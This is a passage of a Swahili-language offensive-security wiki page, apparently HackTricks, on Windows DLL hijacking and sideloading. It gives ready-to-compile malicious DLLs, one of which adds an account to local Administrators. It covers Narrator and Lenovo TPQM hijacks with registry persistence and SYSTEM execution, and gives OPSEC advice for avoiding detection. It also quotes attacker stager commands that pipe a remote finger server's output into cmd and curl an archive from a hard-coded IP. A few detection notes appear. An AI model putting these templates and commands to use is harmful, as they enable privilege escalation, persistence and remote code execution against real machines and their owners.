Katika hali nyingi, DLL unayokompile lazima **iexport kila function inayoimportiwa na mchakato lengwa**. Ikiwa export inayohitajika haipo, binary haiwezi kuisuluhisha na exploit hushindwa.

<details>
<summary>Kiolezo cha C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Mfano wa C++ DLL wenye uundaji wa mtumiaji</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL Mbadala ya C yenye ingizo la thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Uchunguzi kifani: Utekaji wa DLL ya ujanibishaji ya Narrator OneCore TTS (Accessibility/ATs)

Narrator.exe ya Windows bado hukagua DLL ya ujanibishaji inayotabirika na mahususi kwa lugha inapoanzishwa; DLL hiyo inaweza kutekwa ili kutekeleza msimbo wowote na kudumisha ufikiaji.<sup>[[7]](#references)</sup>

Mambo muhimu
- Njia inayokaguliwa (build za sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Njia ya zamani (build za awali): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL inayoweza kuandikwa na kudhibitiwa na mshambulizi ipo kwenye njia ya OneCore, hupakiwa na `DllMain(DLL_PROCESS_ATTACH)` hutekelezwa. Hakuna exports zinazohitajika.

Ugunduzi kwa kutumia Procmon
- Chuja kwa: `Process Name is Narrator.exe` na `Operation is Load Image` au `CreateFile`.
- Anzisha Narrator na uangalie jaribio la kupakia kutoka kwenye njia iliyo hapo juu.

DLL ya chini kabisa
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Ukimya wa OPSEC
- Hijack ya kawaida itazungumza/kuangazia UI. Ili ubaki kimya, wakati wa attach orodhesha thread za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na uisimamishe kwa `SuspendThread`; endelea kwenye thread yako mwenyewe. Tazama PoC kwa code kamili.<sup>[[8]](#references)</sup>

Kuchochea na persistence kupitia usanidi wa Accessibility
- Muktadha wa mtumiaji (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa kutumia yaliyo hapo juu, kuanzisha Narrator hupakia DLL iliyopandikizwa. Kwenye desktop salama (skrini ya kuingia), bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako hutekelezwa kama SYSTEM kwenye desktop salama.

Utekelezaji wa SYSTEM unaochochewa na RDP (lateral movement)
- Ruhusu safu ya usalama ya RDP ya kawaida: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Unganisha kwa RDP kwenye host, kisha kwenye skrini ya kuingia bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako hutekelezwa kama SYSTEM kwenye desktop salama.
- Utekelezaji husimama kipindi cha RDP kinapofungwa—inject/migrate haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza kuiga entry ya registry ya Accessibility Tool (AT) iliyojengewa ndani (kwa mfano, CursorIndicator), kuihariri ili ielekeze kwenye binary/DLL yoyote, kuiingiza, kisha kuweka `configuration` kuwa jina la AT hiyo. Hii hutumia mfumo wa Accessibility kama mpatanishi wa utekelezaji wowote.

Maelezo
- Kuandika ndani ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Logic yote ya payload inaweza kuwekwa kwenye `DLL_PROCESS_ATTACH`; exports hazihitajiki.

## Uchunguzi wa Kesi: CVE-2025-1729 - Kupandisha Haki kwa Kutumia TPQMAssistant.exe

Kesi hii inaonyesha **Phantom DLL Hijacking** katika Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), inayofuatiliwa kama **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Maelezo ya Athari

- **Kipengele**: `TPQMAssistant.exe`, kilicho katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` huendeshwa kila siku saa 9:30 AM katika muktadha wa mtumiaji aliyeingia.
- **Ruhusa za Saraka**: Inaweza kuandikwa na `CREATOR OWNER`, hivyo watumiaji wa ndani wanaweza kuweka faili zozote.
- **Tabia ya Utafutaji wa DLL**: Hujaribu kupakia `hostfxr.dll` kutoka saraka yake ya kazi kwanza na huandika "NAME NOT FOUND" kwenye logi ikiwa haipo, kuashiria kuwa saraka ya ndani hutangulizwa katika utafutaji.

### Utekelezaji wa Exploit

Mshambuliaji anaweza kuweka stub hasidi ya `hostfxr.dll` kwenye saraka hiyo hiyo, akitumia DLL iliyokosekana kutekeleza code katika muktadha wa mtumiaji:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Mtiririko wa Shambulio

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` kwenye `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyoratibiwa iendeshwe saa 9:30 AM katika muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati kazi inaendeshwa, DLL hasidi itaendeshwa katika session ya msimamizi kwa kiwango cha integrity cha kati.
4. Unganisha mbinu za kawaida za UAC bypass ili kupandisha mamlaka kutoka kiwango cha integrity cha kati hadi mamlaka ya SYSTEM.

## Uchunguzi wa Kesi: MSI CustomAction Dropper + DLL Side-Loading kupitia Signed Host (wsc_proxy.exe)

Wahusika wa vitisho mara nyingi huunganisha droppers zinazotumia MSI na DLL side-loading ili kutekeleza payloads chini ya mchakato unaoaminika na uliosainiwa.<sup>[[10]](#references)</sup>

Muhtasari wa mnyororo
- Mtumiaji anapakua MSI. CustomAction huendeshwa kimyakimya wakati wa usakinishaji wa GUI (kwa mfano, kitendo cha LaunchApplication au VBScript), na kuunda upya hatua inayofuata kutoka kwenye rasilimali zilizopachikwa.
- Dropper huandika EXE halali iliyosainiwa na DLL hasidi kwenye saraka moja (jozi ya mfano: wsc_proxy.exe iliyosainiwa na Avast + wsc.dll inayodhibitiwa na mshambuliaji).
- EXE iliyosainiwa inapoanzishwa, mpangilio wa utafutaji wa DLL wa Windows hupakia kwanza wsc.dll kutoka kwenye saraka ya kufanya kazi, na kutekeleza msimbo wa mshambuliaji chini ya mchakato mzazi uliosainiwa (ATT&CK T1574.001).

Uchambuzi wa MSI (mambo ya kuangalia)
- Jedwali la CustomAction:
  - Tafuta maingizo yanayoendesha executables au VBScript. Mfano wa muundo unaotia shaka: LaunchApplication inayoendesha faili iliyopachikwa chinichini.
  - Katika Orca (Microsoft Orca.exe), kagua majedwali ya CustomAction, InstallExecuteSequence na Binary.
- Payloads zilizopachikwa/ zilizogawanywa katika CAB ya MSI:
  - Uchimbaji wa kiutawala: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Au tumia lessmsi: lessmsi x package.msi C:\out
  - Tafuta vipande vingi vidogo vinavyounganishwa na kufasiriwa kwa njia fiche na CustomAction ya VBScript. Mtiririko wa kawaida:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading kwa kutumia wsc_proxy.exe
- Weka faili hizi mbili kwenye folda moja:
  - wsc_proxy.exe: programu mwenyeji halali iliyosainiwa (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye folda yake.
  - wsc.dll: DLL ya mshambuliaji. Ikiwa exports maalum hazihitajiki, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na uelekeze exports zinazohitajika kwenye maktaba halisi huku ukiendesha payload katika DllMain.
- Tengeneza payload ndogo ya DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Kwa mahitaji ya export, tumia framework ya proxying (k.m., DLLirant/Spartacus) kutengeneza forwarding DLL ambayo pia hutekeleza payload yako.

- Mbinu hii hutegemea jinsi binary mwenyeji anavyotafuta DLL. Ikiwa mwenyeji anatumia absolute paths au safe loading flags (k.m., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), huenda hijack isifaulu.
- KnownDLLs, SxS na forwarded exports zinaweza kuathiri mpangilio wa kipaumbele, na lazima zizingatiwe wakati wa kuchagua binary mwenyeji na seti ya exports.

## Triad zilizotiwa saini + payloads zilizosimbwa kwa njia fiche (uchunguzi wa ShadowPad)

Check Point ilieleza jinsi Ink Dragon hutumia **triad ya faili tatu** kuiga programu halali huku payload kuu ikiendelea kusimbwa kwa njia fiche kwenye diski:<sup>[[12]](#references)</sup>

1. **EXE mwenyeji iliyotiwa saini** – wachuuzi kama AMD, Realtek au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Washambuliaji hubadili jina la executable ili ionekane kama binary ya Windows (kwa mfano `conhost.exe`), lakini sahihi ya Authenticode hubaki halali.
2. **Loader DLL hasidi** – huwekwa karibu na EXE ikiwa na jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL hii kwa kawaida ni binary ya MFC iliyofichwa kwa kutumia framework ya ScatterBrain; kazi yake pekee ni kutafuta blob iliyosimbwa kwa njia fiche, kuifungua, na kufanya reflective mapping ya ShadowPad.
3. **Blob ya payload iliyosimbwa kwa njia fiche** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye directory hiyo hiyo. Baada ya kufanya memory-mapping ya payload iliyofunguliwa, loader hufuta faili ya TMP ili kuondoa ushahidi wa forensic.

Vidokezo vya tradecraft:

* Kubadili jina la EXE iliyotiwa saini (huku ukihifadhi `OriginalFileName` ya awali kwenye PE header) huiwezesha kujifanya binary ya Windows huku ikihifadhi sahihi ya mchuuzi. Kwa hiyo, iga tabia ya Ink Dragon ya kuweka binary zinazoonekana kama `conhost.exe` lakini kwa kweli ni utilities za AMD/NVIDIA.
* Kwa kuwa executable hubaki ikiaminika, controls nyingi za allowlisting zinahitaji tu DLL yako hasidi iwekwe kando yake. Lenga kubinafsisha loader DLL; kwa kawaida parent iliyotiwa saini inaweza kuendeshwa bila mabadiliko.
* Decryptor ya ShadowPad inatarajia blob ya TMP iwe karibu na loader na iweze kuandikika ili iweze kuandika sifuri kwenye faili baada ya mapping. Acha directory iweze kuandikika hadi payload ipakie; ikishakuwa kwenye memory, faili ya TMP inaweza kufutwa kwa usalama kwa OPSEC.

### Msururu wa LOLBAS stager + staged archive sideloading (finger → tar/curl → WMI)

Operators huunganisha DLL sideloading na LOLBAS ili artifact pekee maalum kwenye diski iwe DLL hasidi iliyo karibu na EXE inayoaminika:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell iliyofichwa huanzisha `cmd.exe /c`, hupata commands kutoka kwa seva ya Finger, na kuzipeleka kwa `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` hupata maandishi kupitia TCP/79; `| cmd` hutekeleza jibu la seva, hivyo waendeshaji wanaweza kubadilisha second stage upande wa seva.

- **Kupakua/kufungua kumbukumbu zilizojengewa ndani:** Pakua archive yenye kiendelezi kisicho hatari, ifungue, kisha stage sideload target pamoja na DLL chini ya folda ya `%LocalAppData%` yenye jina la nasibu:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` huficha maendeleo na kufuata uelekezaji upya; `tar -xf` hutumia tar iliyojengewa ndani ya Windows.

- **Uanzishaji wa WMI/CIM:** Anzisha EXE kupitia WMI ili telemetry ionyeshe mchakato ulioundwa na CIM inapopakia DLL iliyo kwenye folda hiyo hiyo:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Hufanya kazi na binaries zinazopendelea DLL za ndani (k.m., `intelbq.exe`, `nearby_share.exe`); payload (k.m., Remcos) huendeshwa kwa jina linaloaminika.

- **Uwindaji:** Weka tahadhari kwa `forfiles` pale `/p`, `/m`, na `/c` zinapotumika pamoja; matumizi yake si ya kawaida nje ya admin scripts.


## Uchunguzi wa Kesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uvamizi wa hivi majuzi wa Lotus Blossom ulitumia vibaya mnyororo wa update unaoaminika kusambaza dropper iliyofungwa kwa NSIS, iliyoweka DLL sideload pamoja na payloads zinazoendeshwa kikamilifu kwenye memory.<sup>[[13]](#references)</sup>

Mtiririko wa tradecraft
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huiwekea alama ya **HIDDEN**, hudondosha Bitdefender Submission Wizard `BluetoothService.exe` yenye jina lililobadilishwa, `log.dll` hasidi, na blob iliyosimbwa kwa njia fiche `BluetoothService`, kisha huendesha EXE.
- EXE ya host huingiza `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hupakia blob kwa mmap; `LogWrite` huifungua kwa kutumia mkondo maalum wa LCG (constants **0x19660D** / **0x3C6EF35F**, key material inayotokana na hash ya awali), hubadilisha buffer na kuweka shellcode iliyo wazi, huachilia temporary files, kisha hurukia humo.
- Ili kuepuka IAT, loader hutatua APIs kwa ku-hash majina ya export kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia avalanche ya mtindo wa Murmur (**0x85EBCA6B**) na kulinganisha matokeo na salted target hashes.

Shellcode kuu (Chrysalis)
- Hufungua main module inayofanana na PE kwa kurudia add/XOR/sub kwa key `gQ2JR&9;` katika passes tano, kisha hupakia `Kernel32.dll` → `GetProcAddress` ili kukamilisha utatuzi wa imports.
- Huunda upya strings za majina ya DLL wakati wa runtime kupitia transforms za kuzungusha biti/XOR kwa kila herufi, kisha hupakia `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Hutumia resolver ya pili inayopitia **PEB → InMemoryOrderModuleList**, kuchanganua kila jedwali la export kwa blocks za baiti 4 kwa kutumia mchanganyiko wa mtindo wa Murmur, na kutumia `GetProcAddress` tu ikiwa hash haipatikani.

Usanidi uliopachikwa na C2
- Config iko ndani ya faili iliyodondoshwa ya `BluetoothService` kwenye **offset 0x30808** (size **0x980**) na hufunguliwa kwa RC4 kwa key `qwhvb^435h&*7`, ikifichua URL ya C2 na User-Agent.
- Beacons huunda wasifu wa host uliotenganishwa kwa nukta, huongeza tag `4Q` mwanzoni, kisha huusimba kwa RC4 kwa key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Majibu hufunguliwa kwa RC4 na kuelekezwa kwa kutumia tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + kesi za uhamishaji wa vipande).
- Hali ya utekelezaji inadhibitiwa na CLI args: bila args = husakinisha persistence (service/Run key) inayoelekeza kwenye `-i`; `-i` huanzisha tena self kwa `-k`; `-k` huruka usakinishaji na kuendesha payload.

Loader mbadala iliyozingatiwa
- Uvamizi huohuo ulidondosha Tiny C Compiler na kutekeleza `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, huku `libtcc.dll` ikiwa kando yake. C source iliyotolewa na mshambuliaji ilikuwa na shellcode iliyopachikwa, ika-compile na kuendeshwa kwenye memory bila kuandika PE kwenye diski. Iga kwa kutumia:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Hatua hii ya compile-and-run inayotumia TCC iliingiza `Wininet.dll` wakati wa runtime na kupakua shellcode ya hatua ya pili kutoka URL iliyowekwa kwenye msimbo, na hivyo kutoa loader inayoweza kubadilika na kujifanya kuwa uendeshaji wa compiler.

## Sideloading ya host iliyosainiwa kwa kutumia export proxying + host thread parking

Baadhi ya misururu ya DLL sideloading huongeza **ustadi wa kuhakikisha uthabiti** ili host halali iendelee kufanya kazi kwa muda wa kutosha kupakia hatua zinazofuata vizuri, badala ya kucrash baada ya kupakiwa kwa DLL hasidi.<sup>[[11]](#references)</sup>

Muundo ulioonekana
- Weka EXE inayoaminika karibu na DLL hasidi inayotumia jina la dependency linalotarajiwa, kama vile `version.dll`.
- DLL hasidi **hupitisha kila export inayotarajiwa** kwenda kwa DLL halisi ya mfumo (kwa mfano `%SystemRoot%\\System32\\version.dll`) ili utatuzi wa imports uendelee kufanikiwa na mchakato wa host uendelee kufanya kazi.
- Baada ya kupakiwa, DLL hasidi **hurekebisha entry point ya host** ili main thread iingie kwenye kitanzi kisichoisha cha `Sleep` badala ya kutoka au kutekeleza njia za msimbo ambazo zingesitisha mchakato.
- Thread mpya hufanya kazi hasidi halisi: kusimbua jina au njia ya DLL ya hatua inayofuata (RC4/XOR ni za kawaida), kisha kuizindua kwa `LoadLibrary`.

Kwa nini hili ni muhimu
- Kawaida, DLL proxying hudumisha ulinganifu wa API, lakini haihakikishi kuwa host itaendelea kufanya kazi kwa muda wa kutosha kwa hatua zinazofuata.
- Kuweka main thread kwenye `Sleep(INFINITE)` ni njia rahisi ya kuifanya mchakato uliosainiwa ubaki ukifanya kazi huku loader ikisimbua, ikiandaa au kuanzisha muunganisho wa mtandao wa hatua inayofuata kwenye worker thread.
- Kuchunguza `DllMain` inayotiliwa shaka pekee hukosa muundo huu ikiwa tabia inayovutia hutokea baada ya entry point ya host kurekebishwa na thread ya pili kuanza.

Mtiririko wa chini kabisa wa kazi
1. Nakili EXE ya host iliyosainiwa na utambue DLL inayopakiwa kutoka kwenye saraka ya ndani.
2. Tengeneza proxy DLL inayotoa functions zilezile na kuzielekeza kwa DLL halali.
3. Katika `DllMain(DLL_PROCESS_ATTACH)`, unda worker thread.
4. Kutoka kwenye thread hiyo, rekebisha entry point ya host au utaratibu wa kuanzisha main thread ili izunguke kwenye `Sleep`.
5. Simbua jina/config ya DLL ya hatua inayofuata na uite `LoadLibrary` au uweke payload kwenye memory kwa manual-map.

Viashiria vya uchunguzi wa kiusalama
- Michakato iliyosainiwa inayopakia `version.dll` au maktaba nyingine za kawaida kutoka saraka ya programu yake yenyewe badala ya `System32`.
- Marekebisho ya memory kwenye entry point ya mchakato muda mfupi baada ya picha kupakiwa, hasa jumps/calls zinazoelekezwa kwa `Sleep`/`SleepEx`.
- Threads zilizoundwa na proxy DLL ambazo mara moja huita `LoadLibrary` kwa DLL ya pili yenye jina lililosimbuliwa.
- Proxy DLL zinazotoa exports zote zikiwekwa karibu na executables za vendor ndani ya saraka za staging zinazoweza kuandikika, kama vile `ProgramData`, `%TEMP%`, au njia za archive zilizofunguliwa.

## References

- [1] [Red Canary – Maarifa ya kiintelijensia: Januari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Kupandisha marupurupu kwa kutumia TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking katika Windows. Mfano rahisi wa C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore yatuma malware mpya inayolenga Ulaya](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks zinapokutana na Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Maradufu wa kidijitali: Muundo wa kampeni zinazoendelea za kujifanya na kusambaza Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Maslahi yanayokutana: Uchambuzi wa makundi ya vitisho yanayolenga serikali ya Kusini-Mashariki mwa Asia](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ndani ya Ink Dragon: Kufichua mtandao wa relay na jinsi operesheni fiche ya mashambulizi inavyofanya kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Uchunguzi wa kina wa zana za Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Msururu wa HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Kufuatilia kampeni za ujasusi za 2026 za Iranian APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Kipengele cha `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Kipengele cha `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Kipengele cha `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Kipengele cha `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Kipengele cha `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Kipengele cha `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Kasi na msisimko: Operesheni za Nimbus Manticore wakati wa mzozo wa Iran](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Vitendo vya Task](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 yanalenga serikali za Kusini-Mashariki mwa Asia na miundombinu muhimu](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
